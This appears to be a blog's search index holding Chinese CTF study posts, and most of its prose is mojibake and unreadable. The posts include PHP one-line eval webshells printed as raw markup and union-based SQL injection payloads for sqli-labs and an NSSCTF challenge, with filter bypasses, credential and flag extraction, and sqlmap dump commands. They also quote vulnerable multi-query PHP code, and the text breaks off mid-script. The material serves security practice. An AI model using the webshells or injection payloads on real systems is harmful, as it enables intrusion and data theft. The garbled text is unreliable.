<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>phpä¸€å¥è¯æœ¨é©¬</title>
    <link href="/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <url>/2024/10/09/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<p>äº†è§£ä¸€ä¸‹phpçš„includeå‡½æ•°é¡ºä¾¿äº†è§£ä¸€å¥è¯æœ¨é©¬çš„å„ç§å½¢å¼</p><h2 id="includeå‡½æ•°"><a href="#includeå‡½æ•°" class="headerlink" title="includeå‡½æ•°"></a>includeå‡½æ•°</h2><p>åœ¨phpä¸­ï¼Œincludeå‡½æ•°ç”¨äºå¼•å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚æœå¼•å…¥çš„æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™ä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œä½†ç¨‹åºä¼šç»§ç»­æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;test.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¦‚æœtest.phpä¸å­˜åœ¨ï¼Œåˆ™ä¼šæŠ›å‡ºä¸€ä¸ªè­¦å‘Šï¼Œä½†ç¨‹åºä¼šç»§ç»­æ‰§è¡Œï¼Œè¾“å‡ºhello worldã€‚<br>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ–‡ä»¶ä¸­å®šä¹‰åŠ¨æ€çš„æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$NSS</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NSS&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$NSS</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$NSS</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="æœ¨é©¬ä¸¾ä¾‹"><a href="#æœ¨é©¬ä¸¾ä¾‹" class="headerlink" title="æœ¨é©¬ä¸¾ä¾‹"></a>æœ¨é©¬ä¸¾ä¾‹</h2><?php @eval($_POST['cmd']); ?><?php @eval($_POST[1]); ?><p>,ç®€æä¸€ä¸‹è¿™ä¸¤é©¬æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯æ•°å­—ä¸å­—ç¬¦ä¸²çš„åŒºåˆ«åœ¨äºæ˜¯å¦éœ€è¦å¢åŠ å¼•å·<br>ä¸€å¥è¯æœ¨é©¬é€šå¸¸ä½¿ç”¨ POST è¯·æ±‚è€Œä¸æ˜¯ GETï¼Œå› ä¸º POST è¯·æ±‚å¯ä»¥éšè—å‚æ•°ï¼Œé¿å…åœ¨ URL ä¸­æš´éœ²æ•æ„Ÿæ•°æ®ï¼Œä»è€Œå¢åŠ éšè”½æ€§å’Œå®‰å…¨æ€§ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>webå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/10/09/nssctf2024/"/>
    <url>/2024/10/09/nssctf2024/</url>
    
    <content type="html"><![CDATA[<h2 id="PHPèº²çŒ«çŒ«"><a href="#PHPèº²çŒ«çŒ«" class="headerlink" title="PHPèº²çŒ«çŒ«"></a>PHPèº²çŒ«çŒ«</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqliç»ƒä¹ </title>
    <link href="/2024/10/06/sqli%E7%BB%83%E4%B9%A0/"/>
    <url>/2024/10/06/sqli%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="sqliå¼€å¤´ç®€ä»‹"><a href="#sqliå¼€å¤´ç®€ä»‹" class="headerlink" title="sqliå¼€å¤´ç®€ä»‹"></a>sqliå¼€å¤´ç®€ä»‹</h1><p>sqlæ³¨å…¥æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºï¼Œé€šè¿‡æ„é€ æ¶æ„çš„è¾“å…¥ï¼Œä»è€Œè®©ç¨‹åºæ‰§è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„ä»£ç ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦äº†è§£æºä»£ç ä¸­çš„sqlæ³¨å…¥æ˜¯ä»€ä¹ˆæ ·çš„è¯­å¥ä»€ä¹ˆæ ·çš„è¿‡æ»¤ï¼Œä½†æ˜¯åœ¨é»‘ç›’ä¸­æˆ‘ä»¬æ— æ³•äº†è§£ä»£ç ï¼Œè¿™ä¾¿éœ€è¦æˆ‘ä»¬å»æœ‰è¶³å¤Ÿçš„çŸ¥è¯†ç§¯ç´¯ï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—å°†è¿™ä¸ªé¶åœºæ‰“å®Œï¼Œæˆ‘è¦åšsqlé¢†åŸŸå¤§ç¥ğŸ¥°ï¼</p><h1 id="å‰ç½®çŸ¥è¯†ç‚¹"><a href="#å‰ç½®çŸ¥è¯†ç‚¹" class="headerlink" title="å‰ç½®çŸ¥è¯†ç‚¹"></a>å‰ç½®çŸ¥è¯†ç‚¹</h1><p>è”åˆæŸ¥è¯¢ç‰¹ç‚¹ï¼š<br>1ã€è¦æ±‚å¤šæ¡æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢åˆ—æ•°æ˜¯ä¸€è‡´çš„ï¼<br>2ã€è¦æ±‚å¤šæ¡æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢çš„æ¯ä¸€åˆ—çš„ç±»å‹å’Œé¡ºåºæœ€å¥½ä¸€è‡´<br>3ã€unionå…³é”®å­—é»˜è®¤å»é‡ï¼Œå¦‚æœä½¿ç”¨union all å¯ä»¥åŒ…å«é‡å¤é¡¹  </p><p>version():æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬<br>database():æŸ¥çœ‹ä½¿ç”¨çš„æ•°æ®åº“<br>user():æŸ¥çœ‹å½“å‰ç”¨æˆ·<br>limit:limitå­å¥åˆ†æ‰¹æ¥è·å–æ‰€æœ‰æ•°æ®<br>group_concat():ä¸€æ¬¡æ€§è·å–æ‰€æœ‰çš„æ•°æ®åº“ä¿¡æ¯</p><p>information_schema.tables:åŒ…å«äº†æ•°æ®åº“é‡Œæ‰€æœ‰çš„è¡¨<br>table_name:è¡¨å<br>table_schema:æ•°æ®åº“å<br>column_name:å­—æ®µå</p><p>â€“dbs:æ˜¯æŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“<br>â€“tables:æ˜¯æŸ¥çœ‹æ‰€æœ‰çš„è¡¨<br>â€“columns:æ˜¯æŸ¥çœ‹è¡¨ä¸­æ‰€æœ‰çš„å­—æ®µå<br>â€“dump:æ˜¯æŸ¥è¯¢å“ªä¸ªè¡¨çš„æ•°æ®</p><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h2><ol><li>é¦–å…ˆæˆ‘ä»¬è¾“å…¥1ï¼Œå‘ç°è¿”å›æ­£å¸¸è¾“å…¥?id&#x3D;1â€™ï¼Œè¿”å›é”™è¯¯ï¼Œè¯´æ˜å­˜åœ¨å•å¼•å·æ³¨å…¥<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li><li>è¾“å…¥?id&#x3D;1â€™ and â€˜1â€™&#x3D;â€™1ï¼Œé¡µé¢å›æ˜¾æ­£å¸¸<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li><li>æ„é€ ?id&#x3D;1â€™ and â€˜1â€™&#x3D;â€™1â€™ order by 1â€“+ã€€ã€€é¡µé¢å›æ˜¾æ­£å¸¸<br>?id&#x3D;1â€™ and â€˜1â€™&#x3D;â€™1â€™ order by 2â€“+ã€€ã€€é¡µé¢å›æ˜¾æ­£å¸¸<br>?id&#x3D;1â€™ and â€˜1â€™&#x3D;â€™1â€™ order by 3â€“+ã€€ã€€é¡µé¢å›æ˜¾æ­£å¸¸<br>?id&#x3D;1â€™ and â€˜1â€™&#x3D;â€™1â€™ order by 4â€“+ã€€ã€€å‡ºç°æŠ¥é”™ç•Œé¢<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>æ‰€ä»¥æˆ‘ä»¬äº†è§£åˆ°äº†æ•°æ®åº“è¡¨åªæœ‰ä¸‰åˆ—ï¼Œç¡®å®šäº†å­—æ®µæ•°</li><li>æ„é€ è”åˆæŸ¥è¯¢?id&#x3D;-1â€™ union select 1,2,3â€“+å‰é¢çš„idä¸º-1ï¼Œä½¿å‰é¢çš„è¯­å¥æ— æ•ˆï¼Œç”¨unionæŸ¥è¯¢æ˜¯å¦æœ‰å›æ˜¾ï¼Œå‘ç°2å’Œ3æœ‰å›æ˜¾<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060254643.png" srcset="/img/loading.gif" lazyload></li><li>æ„é€ ?id&#x3D;-1â€™ union select 1,database(),version()â€“+å‘ç°å›æ˜¾äº†æ•°æ®åº“åç§°å’Œç‰ˆæœ¬ä¿¡æ¯<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li><li>æ„é€ ?id&#x3D;-1â€™ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()â€“+å‘ç°å›æ˜¾äº†æ•°æ®åº“ä¸­çš„è¡¨å<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li><li>æŸ¥è¯¢usersçš„å­—æ®µå?id&#x3D;-1â€™ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;â€™usersâ€™â€“+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li><li>æŸ¥è¯¢usersè¡¨ä¸­çš„å†…å®¹-1â€™ union select 1,2,group_concat(0x5c,username,0x5c,password) from users â€“+ 0x5cæ˜¯åæ–œæ çš„åå…­è¿›åˆ¶ï¼Œç”¨äºè¿æ¥è¿™ä¸¤ä¸ªåº“çš„æ•°æ®å†…å®¹</li></ol><h2 id="sqlmapæ³¨å…¥"><a href="#sqlmapæ³¨å…¥" class="headerlink" title="sqlmapæ³¨å…¥"></a>sqlmapæ³¨å…¥</h2><ol><li>sqlmap -u <a href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> â€“dbs æŸ¥çœ‹å¯¹åº”çš„åº“</li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql</title>
    <link href="/2024/10/01/sql/"/>
    <url>/2024/10/01/sql/</url>
    
    <content type="html"><![CDATA[<p>åé¢é¢„è®¡ä¼šæŠŠè¿™äº›ç›¸åŒçš„æ–‡ç« å…¨éƒ¨é›†åˆèµ·æ¥ï¼ŒçŸ¥è¯†ç‚¹ä¸»è¦éƒ½æ˜¯åšé¢˜å¾—æ¥å¾—å¤šåšç‚¹é¢˜ï¼Œçœå¾—ä»€ä¹ˆéƒ½ä¸ä¼šï¼Œéš¾æï¼Œä¹Ÿåªæœ‰åŠå¹´å°±è¦å»è€ƒç ”äº†ï¼Œå”‰ctferèµ·æ­¥å¤ªæ…¢</p><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><p>å…ˆè®²è®²ä»€ä¹ˆåŠ å †å æ³¨å…¥,å †å æ³¨å…¥å°±æ˜¯ä¸€æ¡sqlè¯­å¥åé¢åŠ ;ï¼Œå¤šæ¡è¯­å¥ä¸€èµ·æ‰§è¡Œï¼Œæ¯”å¦‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users;<span class="hljs-keyword">show</span> databases; <br></code></pre></td></tr></table></figure><p>å°±åŒæ—¶æ‰§è¡Œä»¥ä¸Šä¸¤æ¡å‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¢åˆ æ”¹æŸ¥ï¼Œåªè¦æƒé™å¤Ÿ<br>,å…¶å¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ï¼Œåˆæˆ–è€…æƒé™çš„é™åˆ¶åªæœ‰å½“è°ƒç”¨æ•°æ®åº“å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œåˆ©ç”¨mysqli_multi_query()å‡½æ•°å°±æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œä½†å®é™…æƒ…å†µä¸­ï¼Œå¦‚PHPä¸ºäº†é˜²æ­¢sqlæ³¨å…¥æœºåˆ¶ï¼Œå¾€å¾€ä½¿ç”¨è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ˜¯mysqli_ query()å‡½æ•°ï¼Œå…¶åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œåˆ†å·åé¢çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-comment">//logging the connection parameters to a file for analysis.</span><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;ID:&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><br><span class="hljs-comment">// connectivity</span><br><span class="hljs-comment">//mysql connections for stacked query examples.</span><br><span class="hljs-variable">$con1</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$con1</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    @<span class="hljs-title function_ invoke__">mysqli_select_db</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$dbname</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> ( <span class="hljs-string">&quot;Unable to connect to the database: <span class="hljs-subst">$dbname</span>&quot;</span>);<br>&#125;<br><br><br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br>&#123;<br>    <br>    <br>    <span class="hljs-comment">/* store first result set */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_store_result</span>(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Your Username is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;Your Password is : %s&quot;</span>, <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>        &#125;<br><span class="hljs-comment">//            mysqli_free_result($result);</span><br>    &#125;<br>        <span class="hljs-comment">/* print divider */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_more_results</span>(<span class="hljs-variable">$con1</span>))<br>    &#123;<br>            <span class="hljs-comment">//printf(&quot;-----------------\n&quot;);</span><br>    &#125;<br>     <span class="hljs-comment">//while (mysqli_next_result($con1));</span><br>&#125;<br><span class="hljs-keyword">else</span> <br>    &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>    &#125;<br><span class="hljs-comment">/* close connection */</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con1</span>);<br><br></code></pre></td></tr></table></figure><p>å¯¹è¾“å…¥çš„å‚æ•°æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ”»å‡»è€…æ„é€ æ¶æ„çš„æ”»å‡»è¯­å¥é€ æˆäº†SQLæ³¨å…¥æ”»å‡»ï¼Œå­˜åœ¨å›æ˜¾ç‚¹ï¼Œå¯ä»¥è¿›è¡Œè”åˆæ³¨å…¥ï¼Œå¹¶ä¸”å¦‚æœå‡ºç°é”™è¯¯ï¼Œä¼šè¾“å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨æ˜¾é”™æ³¨å…¥ã€‚<br>è¿˜å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œçš„SQLè¯­å¥æŸ¥è¯¢ä½¿ç”¨çš„æ˜¯mysqli_multi_queryå‡½æ•°ï¼Œmysqli_multi_queryå‡½æ•°å¯ä»¥æ‰§è¡Œå¤šæ¡SQLè¯­å¥ã€‚</p><p>åˆ«äººå¾—wpç›´æ¥æ‹¿è¿‡æ¥ï¼Œä¸‹æ¬¡ç»™æˆ‘å¯å‘<br>[SWPUCTF 2021 æ–°ç”Ÿèµ›]sql</p><ol><li><p>æµ‹è¯•</p><blockquote><p>?wllm&#x3D;1 â€“ æ­£å¸¸<br>?wllm&#x3D;1â€™ â€“ æŠ¥é”™<br>?wllm&#x3D;1â€™%23 â€“%23&gt;#â€“ æ­£å¸¸<br>?wllm&#x3D;1â€™or 1&#x3D;1%23 â€“ å‘ç°æœ‰è¿‡æ»¤  </p></blockquote></li><li><p>æµ‹è¯•è¿‡æ»¤</p><blockquote><p>ç©ºæ ¼ï¼Œç­‰å·<br>ç©ºæ ¼&#x3D;&gt;&#x2F;xx&#x2F;<br>ç­‰å·&#x3D;?like</p></blockquote></li><li><p>æµ‹è¯•æ³¨å…¥</p></li></ol><ul><li>æµ‹è¯•é•¿åº¦  <blockquote><p>?wlmm&#x3D;1â€™order&#x2F;**&#x2F;by&#x2F;**&#x2F;3%23 â€“ æ­£å¸¸<br>?wlmm&#x3D;1â€™order&#x2F;**&#x2F;by&#x2F;**&#x2F;4%23 â€“ é”™è¯¯<br>â€“ æµ‹è¯•é•¿åº¦ä¸º3</p></blockquote></li><li>æµ‹è¯•å›æ˜¾  <blockquote><p>?wlmm&#x3D;-1â€™union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3%23 # 2,3å›æ˜¾ä½ç½®</p></blockquote></li><li>æŸ¥åº“  <blockquote><p>?wllm&#x3D;-1â€™union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,database()%23 # test_db</p></blockquote></li><li>æŸ¥è¡¨  <blockquote><p>wllm&#x3D;-1â€™union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;â€˜test_dbâ€™%23 â€“ LTLT_flag,users</p></blockquote></li><li>æŸ¥åˆ—  <blockquote><p>wllm&#x3D;-1â€™union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;â€˜test_dbâ€™%23<br>â€“ id,flag,id,username</p></blockquote></li><li>æŸ¥å†…å®¹<blockquote><p>?wllm&#x3D;-1â€™union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(flag)&#x2F;**&#x2F;from&#x2F;**&#x2F;test_db.LTLT_<br>flag%23<br>â€“ NSSCTF{e99758c1-d31b</p></blockquote></li><li>ä½æ•°é•¿åº¦ä¸è¶³<br>ä½¿ç”¨æˆªæ–­å‡½æ•°è¿›è¡Œç»•è¿‡ï¼Œsubstrï¼Œrightï¼ŒREVERSE è¢«è¿‡æ»¤ï¼ˆæµ‹è¯•å‡ºæ¥çš„ï¼‰ï¼Œåªèƒ½ç”¨mid</li><li>midæˆªå–ï¼Œå› ä¸ºå›æ˜¾åªèƒ½æœ‰20ä¸ªï¼Œæ‰€ä»¥20ï¼Œä¸€ç»„æˆªå–<blockquote><p>?wllm&#x3D;-1â€™union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,mid(group_concat(flag),20,20)&#x2F;**&#x2F;from&#x2F;**&#x2F;tes<br>t_db.LTLT_flag%23</p></blockquote></li><li>éœ€è¦è¯»ä¸‰ç»„<br>NSSCTF{e99758c1-d31b-4497-8d44-abfe84caa0ed}</li></ul><p>å†™ä¸€ä¸ªå¯èƒ½æœ‰é—®é¢˜å¾—ç‚¹,-1ä¸ºä»€ä¹ˆæœ‰æ˜¾ç¤ºï¼Œ1æ²¡æœ‰æ˜¾ç¤º<br>å¸ƒå°”é€»è¾‘ï¼š<br>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ•°æ®åº“ä¼šå¯¹è¾“å…¥è¿›è¡Œå¸ƒå°”è¯„ä¼°ã€‚æ¯”å¦‚ï¼Œå¦‚æœåŸå§‹æŸ¥è¯¢æ˜¯ï¼š</p><blockquote><p>SELECT * FROM users WHERE active &#x3D; 1;  </p></blockquote><p>å¦‚æœæ•°æ®åº“ä¸­æ²¡æœ‰ä»»ä½•è®°å½•çš„ active å­—æ®µä¸º 1ï¼Œé‚£ä¹ˆè¿™ä¸ªæŸ¥è¯¢ä¸ä¼šè¿”å›ä»»ä½•ç»“æœã€‚ä½†å¦‚æœç”¨ -1 æ›¿ä»£ï¼Œå¯èƒ½ä¼šå¯¼è‡´è¿”å›ç¬¦åˆæ¡ä»¶çš„ç»“æœã€‚<br>é”™è¯¯å¤„ç†å’Œä¿¡æ¯æ³„éœ²ï¼š</p><p>æ•°æ®åº“åœ¨å¤„ç† 1 å’Œ -1 æ—¶çš„é”™è¯¯å¤„ç†æ–¹å¼å¯èƒ½ä¸åŒã€‚ä¾‹å¦‚ï¼Œå¦‚æœ 1 å¯¼è‡´ä¸€ä¸ªé”™è¯¯æˆ–å¼‚å¸¸ï¼Œè€Œ -1 ä¸ä¼šï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸åŒçš„è¡Œä¸ºã€‚åœ¨æŸäº›ç³»ç»Ÿä¸­ï¼Œ-1 å¯èƒ½è¢«ç”¨ä½œç‰¹å®šçš„æ ‡å¿—ï¼Œè¡¨ç¤ºæŸç§çŠ¶æ€æˆ–æ¡ä»¶ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>newstartctf2024</title>
    <link href="/2024/10/01/newstartctf2024/"/>
    <url>/2024/10/01/newstartctf2024/</url>
    
    <content type="html"><![CDATA[<h3 id="ä¼šèµ¢å—"><a href="#ä¼šèµ¢å—" class="headerlink" title="ä¼šèµ¢å—"></a>ä¼šèµ¢å—</h3><p>è¯´æ˜¯å‰ç«¯å…¶å®åªä¸è¿‡æ˜¯æˆ‘å†™ctfé‡åˆ°é—®é¢˜åœ¨æ‰¾è§£å†³æ–¹æ¡ˆç½¢äº†ï¼Œä¸‹æ¬¡ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æ‰ä¼šåˆé‡è§jsï¼Œ<br>jså¯ä»¥åœ¨æ§åˆ¶å°èµ·åˆ°é‡è¦çš„åŠŸèƒ½</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">revealFlag</span>(<span class="hljs-params">className</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/flag/<span class="hljs-subst">$&#123;className&#125;</span>`</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                    &#125;<br>                &#125;);<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                    <span class="hljs-variable 